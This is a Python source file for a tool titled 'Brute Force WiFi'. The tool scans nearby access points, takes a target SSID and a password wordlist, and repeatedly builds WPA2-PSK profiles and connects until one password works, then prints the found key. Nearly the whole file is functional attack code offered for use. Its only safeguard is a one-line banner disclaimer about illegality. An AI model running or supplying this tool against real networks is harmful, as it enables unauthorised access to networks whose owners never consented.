import os
os.system('')
os.system('cls')
print("Started....")

from colorama import init, Fore
import pywifi
from pywifi import Profile, const
import time
import sys

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
ifaces = wifi.interfaces()[0]
pwd = ''

init()
G = Fore.GREEN
R = Fore.RED
W = Fore.WHITE
C = Fore.CYAN
Y = Fore.YELLOW
rout = 0

def attack(bssid, pwd, ssid, num):
    prof = Profile()
    prof.ssid = ssid
    prof.auth = const.AUTH_ALG_OPEN
    prof.akm.append(const.AKM_TYPE_WPA2PSK)
    prof.cipher = const.CIPHER_TYPE_CCMP
    prof.key = pwd
    tmp = iface.add_network_profile(prof)
    time.sleep(0.1)
    iface.connect(tmp)
    time.sleep(0.35)
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def main(bssid, pwd, ssid):
    input(f"\n\n{G}[{W}Info{G}]If you are connected to a network, disconnect it first(But don't turn off wifi) and then press Enter....")
    bssid = input(f"{W}   Enter the 'bssid'             :{G} ")
    ssid = input(f"{W}   Enter the 'ssid'              :{G} ")
    pwdfile = input(f"{W}   Enter the wordlist(With path) :{G} ")
    if bssid == '' or ssid == '' or pwdfile == '':
        print(f"Enter valied data and try again!{Fore.RESET}")
        sys.exit(0)
    else:
        print(f"""
        {G}********************************************************************
            Attacking....
            
            Target   :{Y}{ssid}{G}
            Bssid    :{Y}{bssid}{G}
            wordlist :{Y}{pwdfile}{G}
        ********************************************************************
        """)
        try:
            num = 0
            with open(pwdfile, 'r', encoding='utf8') as pwdf:
                for line in pwdf:
                    num += 1
                    line = line.split('\n')
                    pwd = line[0]
                    if attack(bssid, pwd, ssid, num):
                        print(f"\n{G}[{Y}KEY{G}]Password found: {Y}{pwd}{Fore.RESET}")
                        sys.exit(0)
                    else:
                        print(f"\n{G}[{R}NO{G}]Not mached: {W}{pwd}{Fore.RESET}")
                sys.exit(0)
        except Exception as e:
            print(str(e))
            sys.exit(0)

def bannar():
    print(f"""{G}
    **********************************************************************
        |||||||\\\\\   ||||||||  ||||||||||  {C} '  '    '     '    '  '{G}
        ||||    ||   ||||         ||||   {C} /   /   /         \   \   \\{G}
        |||||||||/   ||||||       |||| {C}  '   '   '    {G}/|\\{C}    '   '   '{G}
        ||||    |\   ||||         |||| {C} :   :   (    {Y}("'"){C}    )   :   :{G}
        ||||    ||   ||||         ||||  {C} .   .   .   {G} ||| {C}   .   .   .{G}
        |||||||///   ||||      |||||||||| {C}\   \   \ {G} /|||\ {C} /   /   /
        {W}Brute Force WiFi  {G}By: {Y}Max Mouse{C}     .  .   .       .   .   .{G}
    
    **********************************************************************
    """)
    print(f"[{Y}DISCLAIMER!{G}]Using this tool to connect to a free wifi without their permission is {C}illegal!{G}")
    input("\nPress enter to begin the scan....")
bannar()
print(f"{G}[{W}Info{G}]Preparing the scan....")

while True:
    try:
        try:
            rout += 1
            print(f"{G}Scaning for wifi....{W}(Ctrl+c to quit!){G} Route: {rout}")
            ifaces.scan()
            time.sleep(0.5)
            results = ifaces.scan_results()
        except ValueError:
            print(f"[{R}ERROR{G}]{Y}Make sure that the WiFi is turned on!{Fore.RESET}")
            sys.exit(0)
        nets = 0
        for i in results:
            bssid = i.bssid
            ssid = i.ssid
            nets += 1
            print(f"{W}    Bssid: {R}{bssid}{W} , Ssid: {R}{ssid}")
        print(f"    {G}Found: {W}{nets}{G} access poits\n")
    except KeyboardInterrupt:
        print(f"{Y}Scan terminated!....Continuing....{G}")
        Fore.RESET
        main(bssid, pwd, ssid)